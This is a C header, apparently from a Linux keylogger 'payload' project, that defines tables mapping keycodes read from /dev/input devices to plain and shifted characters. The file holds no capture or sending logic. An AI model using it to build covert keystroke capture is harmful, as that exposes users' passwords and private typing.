
#ifndef PAYLOAD_H
#define PAYLOAD_H

#include "elf_utils.h"

#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <errno.h>
#include <strings.h>
#include <sys/select.h>
#include <unistd.h>
#include <linux/input.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdbool.h>
#include <stdbool.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <linux/input.h>
#include <errno.h>
#include <unistd.h>
#include <limits.h>

#define BUFFER_SIZE 32
#define NB_KEYCODES 84
#define NB_EVENTS   512

#define EV_KEY_PRESSED 1
#define EV_KEY_RELEASE 0

#define DIR_PATH ("/dev/input/by-path/")

static char *KEYCODES[] = {
    "<unknown>", "<ESC>",
    "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",
    "<Backspace>", "<Tab>",
    "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "<Enter>", "<LCtrl>",
    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "<LShift>",
    "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "<RShift>", "<KP*>",
    "<LAlt>", " ", "<CapsLock>",
    "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
    "<NumLock>", "<ScrollLock>", "<KP7>", "<KP8>", "<KP9>", "<KP->", "<KP4>", "<KP5>", "<KP6>",
    "<KP+>", "<KP1>", "<KP2>", "<KP3>", "<KP0>", "<KP.>", "<unknown>", "<unknown>", "<unknown>",
    "<F11>", "<F12>",
    "<unknown>", "<unknown>", "<unknown>", "<unknown>", "<unknown>", "<unknown>", "<unknown>",
    "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", "<unknown>",
    "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>",
    "<PageDown>", "<Insert>", "<Delete>", NULL
};

static char *SHIFT_KEYCODES[] = {
    "<unknown>", "<ESC>", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+",
    "<Backspace>", "<Tab>", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P",
    "{", "}", "<Enter>", "<LCtrl>", "A", "S", "D", "F", "G", "H", "J", "K", "L", ":",
    "\"", "~", "<LShift>", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">", "?",
    "<RShift>", "<KP*>", "<LAlt>", " ", "<CapsLock>",
    "<F1>", "<F2>", "<F3>", "<F4>", "<F5>", "<F6>", "<F7>", "<F8>", "<F9>", "<F10>",
    "<NumLock>", "<ScrollLock>", "<KP7>", "<KP8>", "<KP9>", "<KP->", "<KP4>", "<KP5>", "<KP6>",
    "<KP+>", "<KP1>", "<KP2>", "<KP3>", "<KP0>", "<KP.>", "<unknown>", "<unknown>", "<unknown>",
    "<F11>", "<F12>", "<unknown>", "<unknown>", "<unknown>", "<unknown>", "<unknown>", "<unknown>",
    "<unknown>",  "<KPEnter>", "<RCtrl>", "<KP/>", "<SysRq>", "<RAlt>", "<unknown>",
    "<Home>", "<Up>", "<PageUp>", "<Left>", "<Right>", "<End>", "<Down>", "<PageDown>", "<Insert>", "<Delete>",
    NULL
};

#endif // PAYLOAD_H
